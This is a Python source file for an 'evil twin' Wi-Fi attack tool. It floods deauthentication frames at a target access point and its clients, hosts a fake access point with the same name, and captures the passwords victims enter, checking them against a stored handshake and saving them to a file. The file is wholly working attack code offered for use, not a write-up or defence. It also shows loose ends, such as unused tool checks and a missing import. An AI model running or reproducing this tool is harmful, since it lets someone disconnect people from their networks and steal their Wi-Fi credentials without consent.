# eviltwin.py
import time
import sys
import threading
import subprocess
import tempfile
import os
from scapy.all import *
from config import C_GREEN, C_RED, C_YELLOW, C_RESET, C_CYAN, C_WHITE
from utils import run_command
import cracker

class EvilTwinAttack:
    def __init__(self, esp_driver, db_handler, target_bssid, target_channel, target_ssid, interface=None):
        self.esp = esp_driver
        self.db = db_handler
        self.bssid = target_bssid
        self.channel = target_channel
        self.ssid = target_ssid
        self.interface = interface  # Wireless interface for deauth attacks
        self.handshake_file = ""
        
        # Deauth attack variables
        self.stop_deauth = False
        self.deauth_threads = []
        self.deauth_processes = []
        self.clients = set()
        self.correct_password = None
        self.blacklist_file = None
        self.total_deauths = 0
        
        # Performance tracking
        self.aireplay_count = 0
        self.mdk3_count = 0
        self.scapy_count = 0
        self.esp_count = 0

    def _create_blacklist_file(self):
        """Create blacklist file for mdk3"""
        try:
            # Create temporary blacklist file
            fd, self.blacklist_file = tempfile.mkstemp(suffix='_blacklist.txt', text=True)
            with os.fdopen(fd, 'w') as f:
                f.write(self.bssid + '\n')
            return True
        except Exception as e:
            print(f"{C_RED}[!] Failed to create blacklist file: {e}{C_RESET}")
            return False

    def _cleanup_blacklist(self):
        """Remove temporary blacklist file"""
        if self.blacklist_file and os.path.exists(self.blacklist_file):
            try:
                os.remove(self.blacklist_file)
            except:
                pass

    def _get_interface_mac(self):
        """Get MAC address of the interface"""
        try:
            return get_if_hwaddr(self.interface)
        except:
            return "00:11:22:33:44:55"

    def _setup_interface(self):
        """Prepare the interface for deauth attacks"""
        if not self.interface:
            return False
        
        try:
            # Kill interfering processes first
            print(f"{C_YELLOW}[*] Killing interfering processes...{C_RESET}")
            run_command(["airmon-ng", "check", "kill"])
            run_command(["killall", "wpa_supplicant", "NetworkManager"])
            
            # Bring interface down
            run_command(["ip", "link", "set", self.interface, "down"])
            time.sleep(1)
            
            # Set to monitor mode
            run_command(["iw", "dev", self.interface, "set", "type", "monitor"])
            time.sleep(1)
            
            # Bring interface up
            run_command(["ip", "link", "set", self.interface, "up"])
            time.sleep(1)
            
            # Set channel
            run_command(["iwconfig", self.interface, "channel", str(self.channel)])
            time.sleep(1)
            
            print(f"{C_GREEN}[+] Interface {self.interface} set to monitor mode on channel {self.channel}{C_RESET}")
            return True
            
        except Exception as e:
            print(f"{C_RED}[!] Failed to setup interface: {e}{C_RESET}")
            return False

    def _enforce_channel(self):
        """Keep interface on the correct channel"""
        while not self.stop_deauth:
            try:
                run_command(["iwconfig", self.interface, "channel", str(self.channel)])
                time.sleep(2)
            except:
                pass

    def _sniffer_thread(self):
        """Continuous sniffer to find clients"""
        while not self.stop_deauth:
            try:
                sniff(iface=self.interface, prn=self._sniff_callback, timeout=1.0, store=0)
            except Exception:
                pass

    def _sniff_callback(self, pkt):
        """Process sniffed packets to find clients"""
        if pkt.haslayer(Dot11):
            addr1 = pkt.addr1.lower() if pkt.addr1 else ""
            addr2 = pkt.addr2.lower() if pkt.addr2 else ""
            
            client_mac = None
            if self.bssid == addr1 and addr2 != "ff:ff:ff:ff:ff:ff" and not addr2.startswith("33:33"):
                client_mac = addr2
            elif self.bssid == addr2 and addr1 != "ff:ff:ff:ff:ff:ff" and not addr1.startswith("33:33"):
                client_mac = addr1
            
            if client_mac and client_mac not in self.clients:
                self.clients.add(client_mac)

    def _scapy_deauth(self):
        """Standard deauth loop (Matching attacker.py logic)"""
        try:
            print(f"{C_GREEN}[+] Starting Scapy deauth attack{C_RESET}")
            
            # Broadcast deauth packet
            pkt_bcast = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", 
                                        addr2=self.bssid, 
                                        addr3=self.bssid)/Dot11Deauth(reason=7)
            
            while not self.stop_deauth:
                try:
                    # 1. Send broadcast deauth (5 packets)
                    sendp(pkt_bcast, iface=self.interface, count=5, verbose=False)
                    self.scapy_count += 5
                    self.total_deauths += 5
                    
                    # 2. Send targeted deauth to established clients (3 packets each)
                    if self.clients:
                        current_clients = list(self.clients)
                        for client_mac in current_clients:
                            if not client_mac.startswith(("33:33", "ff:ff", "01:00")):
                                pkt_client = RadioTap()/Dot11(addr1=client_mac, 
                                                            addr2=self.bssid, 
                                                            addr3=self.bssid)/Dot11Deauth(reason=7)
                                sendp(pkt_client, iface=self.interface, count=3, verbose=False)
                                self.scapy_count += 3
                                self.total_deauths += 3
                    
                    # 3. Sleep 0.5s (Proven effective in attacker.py)
                    time.sleep(0.5)
                    
                except Exception as e:
                    print(f"{C_RED}[!] Scapy error: {e}{C_RESET}")
                    time.sleep(1)
                    
        except Exception as e:
            print(f"{C_RED}[!] Scapy thread crashed: {e}{C_RESET}")

    def _esp_deauth(self):
        """Use ESP device for additional deauth"""
        try:
            if not self.esp or not self.esp.is_connected:
                print(f"{C_YELLOW}[!] ESP not connected, skipping ESP deauth{C_RESET}")
                return
            
            print(f"{C_GREEN}[+] Starting ESP deauth attack{C_RESET}")
            
            while not self.stop_deauth:
                try:
                    # Send deauth command to ESP
                    self.esp.start_attack(self.bssid, self.channel, duration=2)
                    self.esp_count += 1
                    self.total_deauths += 50
                    # ESP needs time to process and cool down to avoid serial congestion
                    time.sleep(3)  
                except Exception as e:
                    print(f"{C_RED}[!] ESP deauth error: {e}{C_RESET}")
                    time.sleep(2)
        except Exception as e:
            print(f"{C_RED}[!] ESP deauth thread crashed: {e}{C_RESET}")

    def _start_deauth_attacks(self):
        """Start deauth attacks"""
        print(f"\n{C_CYAN}[*] Starting DEAUTH ATTACK (Scapy + ESP){C_RESET}")
        
        # Start channel enforcer
        chan_thread = threading.Thread(target=self._enforce_channel, daemon=True)
        chan_thread.start()
        self.deauth_threads.append(chan_thread)
        
        # Start Sniffer (Critical for targeted deauths)
        sniffer_thread = threading.Thread(target=self._sniffer_thread, daemon=True)
        sniffer_thread.start()
        self.deauth_threads.append(sniffer_thread)
        
        # Start Scapy thread (Main deauth)
        scapy_thread = threading.Thread(target=self._scapy_deauth, daemon=True)
        scapy_thread.start()
        self.deauth_threads.append(scapy_thread)
        
        # Start ESP deauth thread
        esp_thread = threading.Thread(target=self._esp_deauth, daemon=True)
        esp_thread.start()
        self.deauth_threads.append(esp_thread)
        
        print(f"{C_GREEN}[+] Deauth threads started{C_RESET}")

    def _stop_deauth_attacks(self):
        """Stop all deauth attacks"""
        print(f"{C_YELLOW}[*] Stopping all deauth attacks...{C_RESET}")
        
        self.stop_deauth = True
        
        # Kill all subprocesses
        for process in self.deauth_processes:
            try:
                if process.poll() is None:
                    process.terminate()
                    time.sleep(0.5)
                    if process.poll() is None:
                        process.kill()
            except:
                pass
        
        # Wait for threads to finish
        for thread in self.deauth_threads:
            try:
                thread.join(timeout=2.0)
            except:
                pass
        
        # Cleanup blacklist file
        self._cleanup_blacklist()
        
        print(f"{C_GREEN}[+] All deauth attacks stopped{C_RESET}")

    def _display_status(self):
        """Display real-time attack status"""
        try:
            last_display = time.time()
            display_count = 0
            
            while not self.stop_deauth:
                current_time = time.time()
                
                # Update every 3 seconds
                if current_time - last_display > 3.0:
                    display_count += 1
                    
                    # Clear line and display status
                    sys.stdout.write("\r\033[K")
                    
                    status_line = f"{C_CYAN}[{display_count}] {C_RESET}"
                    
                    # Clients
                    if self.clients:
                        status_line += f"{C_YELLOW}👥 {len(self.clients)} clients{C_RESET} "
                    
                    # Deauth counters
                    status_line += f"{C_RED}🔥 "
                    status_line += f"S:{self.scapy_count} "
                    if self.esp_count > 0:
                        status_line += f"E:{self.esp_count} "
                    status_line += f"T:{self.total_deauths}{C_RESET}"
                    
                    # Evil twin status
                    status_line += f" {C_GREEN}👿 Evil Twin: '{self.ssid}'{C_RESET}"
                    
                    sys.stdout.write(status_line)
                    sys.stdout.flush()
                    
                    last_display = current_time
                
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"{C_RED}[!] Status display error: {e}{C_RESET}")

    def run(self):
        """Main attack method"""
        # 1. Check if handshake exists
        info = self.db.get_info(self.bssid)
        if not info or not info.get('Handshake') or not info.get('HSFile'):
            print(f"{C_RED}[!] Error: No Handshake found for this network!{C_RESET}")
            return
        
        self.handshake_file = info['HSFile']
        print(f"{C_GREEN}[+] Handshake file found: {self.handshake_file}{C_RESET}")
        
        # 2. Check tools availability
        print(f"{C_CYAN}[*] Checking attack tools...{C_RESET}")

        def check_tool_exists(tool_name):
            """Check if a tool exists using multiple methods"""
            methods = [
                # Method 1: Use which command
                lambda: subprocess.run(['which', tool_name], 
                                    capture_output=True, 
                                    timeout=2).returncode == 0,
                
                # Method 2: Use shutil.which
                lambda: bool(shutil.which(tool_name)),
                
                # Method 3: Try running with --help
                lambda: subprocess.run([tool_name, '--help'], 
                                    capture_output=True, 
                                    timeout=3,
                                    stderr=subprocess.STDOUT,
                                    stdout=subprocess.DEVNULL).returncode != 127,  # 127 means command not found
                
                # Method 4: Try running with --version
                lambda: subprocess.run([tool_name, '--version'], 
                                    capture_output=True, 
                                    timeout=3,
                                    stderr=subprocess.STDOUT,
                                    stdout=subprocess.DEVNULL).returncode != 127,
            ]
            
            for method in methods:
                try:
                    if method():
                        return True
                except:
                    continue
            
            return False

        # Check each tool
        tools_status = {}
        critical_tools = ['aireplay-ng', 'mdk3']

        for tool in critical_tools:
            if check_tool_exists(tool):
                tools_status[tool] = True
                print(f"{C_GREEN}[✓] {tool}: Available{C_RESET}")
            else:
                tools_status[tool] = False
                print(f"{C_YELLOW}[✗] {tool}: Not found{C_RESET}")

        # Check optional tools
        optional_tools = ['airodump-ng', 'aircrack-ng', 'airmon-ng', 'iwconfig', 'iw']
        for tool in optional_tools:
            if check_tool_exists(tool):
                print(f"{C_GREEN}[✓] {tool}: Available{C_RESET}")
            else:
                print(f"{C_YELLOW}[!] {tool}: Not found (optional){C_RESET}")

        # Decision logic
        if not any(tools_status.values()):  # No critical tools available
            print(f"\n{C_RED}[!] ERROR: No deauth tools available!{C_RESET}")
            print(f"{C_YELLOW}[*] You need at least one of: aireplay-ng or mdk3{C_RESET}")
            print(f"{C_YELLOW}[*] Install with:{C_RESET}")
            print(f"    sudo apt-get install aircrack-ng  # for aireplay-ng")
            print(f"    sudo apt-get install mdk3         # for mdk3")
            
            choice = input(f"\n{C_YELLOW}[?] Continue without deauth attacks? (y/n): {C_RESET}")
            if choice.lower() != 'y':
                return
            else:
                print(f"{C_YELLOW}[*] Proceeding without deauth attacks...{C_RESET}")
                time.sleep(1)
        else:
            # At least one tool is available
            available = [tool for tool, status in tools_status.items() if status]
            print(f"\n{C_GREEN}[+] Available deauth tools: {', '.join(available)}{C_RESET}")
            print(f"{C_YELLOW}[*] Attack will use: {available[0]}{' + ' + available[1] if len(available) > 1 else ''}{C_RESET}")
            time.sleep(1)
        
        # 3. Setup interface
        if self.interface:
            if not self._setup_interface():
                print(f"{C_RED}[!] Cannot perform deauth attacks without interface{C_RESET}")
                return
        
        # 4. Start deauth attacks
        self._start_deauth_attacks()
        
        # 5. Start status display
        status_thread = threading.Thread(target=self._display_status, daemon=True)
        status_thread.start()
        
        # 6. Start Evil Twin on ESP
        print(f"\n{C_CYAN}[*] Starting Evil Twin on ESP...{C_RESET}")
        print(f"{C_YELLOW}[*] Fake AP SSID: '{self.ssid}'{C_RESET}")
        
        self.esp.start_host(self.ssid, self.channel)
        time.sleep(2)
        self.esp.start_attack(self.bssid, self.channel)
        
        print(f"\n{C_GREEN}[+] Attack is running!{C_RESET}")
        print(f"{C_YELLOW}[*] Clients are being deauthenticated from {self.bssid}{C_RESET}")
        print(f"{C_YELLOW}[*] They will connect to Evil Twin: '{self.ssid}'{C_RESET}")
        print(f"{C_YELLOW}[*] Waiting for password... (Ctrl+C to stop){C_RESET}\n")
        
        try:
            while True:
                # Check for captured password
                if self.esp.captured_password:
                    raw_pass = self.esp.captured_password.strip()
                    self.esp.captured_password = None
                    
                    print(f"\n{C_CYAN}[+] Password attempt received: '{raw_pass}'{C_RESET}")
                    
                    # Validate password length
                    if len(raw_pass) < 8:
                        print(f"{C_RED}[!] Invalid: Password too short (<8 chars){C_RESET}")
                        self.esp.send_no()
                        continue
                    
                    if len(raw_pass) > 63:
                        print(f"{C_RED}[!] Invalid: Password too long (>63 chars){C_RESET}")
                        self.esp.send_no()
                        continue
                    
                    # Verify password
                    print(f"{C_YELLOW}[*] Verifying password...{C_RESET}")
                    if cracker.verify_password(self.handshake_file, self.bssid, self.ssid, raw_pass):
                        # SUCCESS!
                        print(f"\n{C_GREEN}{'='*70}{C_RESET}")
                        print(f"{C_GREEN}[!!!] PASSWORD CRACKED SUCCESSFULLY [!!!]{C_RESET}")
                        print(f"{C_GREEN}{'='*70}{C_RESET}")
                        print(f"{C_WHITE}    Target: {self.ssid}{C_RESET}")
                        print(f"{C_WHITE}    BSSID: {self.bssid}{C_RESET}")
                        print(f"{C_WHITE}    Password: {raw_pass}{C_RESET}")
                        print(f"{C_GREEN}{'='*70}{C_RESET}")
                        
                        self.esp.send_ok()
                        self.correct_password = raw_pass
                        
                        # Save password
                        with open("cracked.txt", "a") as f:
                            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                            f.write(f"[{timestamp}] SSID: {self.ssid} | BSSID: {self.bssid} | Password: {raw_pass}\n")
                        
                        # Stop attacks
                        self._stop_deauth_attacks()
                        self.esp.stop_all()
                        
                        # Show summary
                        print(f"\n{C_YELLOW}[*] ATTACK SUMMARY:{C_RESET}")
                        print(f"{C_WHITE}    Total clients targeted: {len(self.clients)}{C_RESET}")
                        print(f"{C_WHITE}    Deauth packets sent: {self.total_deauths}{C_RESET}")
                        print(f"{C_WHITE}    - Scapy: {self.scapy_count}{C_RESET}")
                        print(f"{C_WHITE}    - ESP: {self.esp_count}{C_RESET}")
                        print(f"{C_WHITE}    Password saved to: cracked.txt{C_RESET}")
                        print(f"{C_GREEN}[+] Attack completed successfully!{C_RESET}")
                        
                        return
                    else:
                        print(f"{C_RED}[-] Password incorrect{C_RESET}")
                        self.esp.send_no()
                
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print(f"\n\n{C_RED}[!] Attack stopped by user{C_RESET}")
        
        finally:
            # Cleanup
            self._stop_deauth_attacks()
            self.esp.stop_all()
            
            # Restore interface
            if self.interface:
                try:
                    run_command(["ip", "link", "set", self.interface, "down"])
                    run_command(["iw", "dev", self.interface, "set", "type", "managed"])
                    run_command(["ip", "link", "set", self.interface, "up"])
                    print(f"{C_GREEN}[+] Interface {self.interface} restored to managed mode{C_RESET}")
                except Exception as e:
                    print(f"{C_RED}[!] Failed to restore interface: {e}{C_RESET}")
            
            print(f"\n{C_YELLOW}[*] Final stats:{C_RESET}")
            print(f"{C_WHITE}    Total deauth packets: {self.total_deauths}{C_RESET}")
            print(f"{C_WHITE}    Clients discovered: {len(self.clients)}{C_RESET}")
            
            if self.correct_password:
                print(f"{C_GREEN}[+] Password found: {self.correct_password}{C_RESET}")
            else:
                print(f"{C_RED}[-] No password found{C_RESET}")